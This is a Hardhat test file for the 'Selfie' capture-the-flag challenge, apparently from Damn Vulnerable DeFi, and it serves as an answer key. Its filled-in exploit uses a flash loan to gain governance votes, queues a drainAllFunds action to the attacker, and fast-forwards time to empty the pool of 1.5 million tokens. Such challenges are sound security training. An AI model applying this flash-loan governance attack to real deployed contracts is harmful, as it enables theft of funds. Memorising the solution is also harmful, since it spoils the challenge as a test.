const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Selfie', function () {
    let deployer, attacker;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);

        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
        this.pool = await SelfiePoolFactory.deploy(
            this.token.address,
            this.governance.address    
        );

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal(TOKENS_IN_POOL);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        //using the flash loan to gain voting power and create an action that calls drainAllFunds method of the pool

        const AttackerContractFactory = await ethers.getContractFactory("SelfiePoolAttacker",attacker);

        const ABI = [ "function drainAllFunds(address receiver) external" ];
        
        const iface = new ethers.utils.Interface(ABI);
        
        const data = iface.encodeFunctionData("drainAllFunds", [attacker.address]);

        const attackerContract = await AttackerContractFactory.deploy(
            data,
            this.pool.address,
            this.governance.address,
        );

        await attackerContract.flashLoan(TOKENS_IN_POOL);

        //waiting more than the required time to run an action (2 days)

        const threeDays = 3 * 24 * 60 * 60;
        await ethers.provider.send("evm_increaseTime", [threeDays]);

        const actionId = await attackerContract.actionId();

        const governance = await this.governance.connect(attacker);
        await governance.executeAction(actionId);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.equal(TOKENS_IN_POOL);        
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal('0');
    });
});
